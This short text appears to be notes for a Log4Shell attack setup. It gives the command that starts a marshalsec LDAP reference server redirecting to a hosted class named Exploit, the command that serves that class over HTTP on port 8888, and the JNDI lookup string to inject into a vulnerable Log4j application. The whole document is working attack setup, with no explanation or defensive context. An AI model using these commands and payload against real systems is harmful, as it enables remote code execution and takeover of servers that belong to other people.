java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:8888/#Exploit

python -m http.server 8888

${jndi:ldap://ip:1389/#Exploit}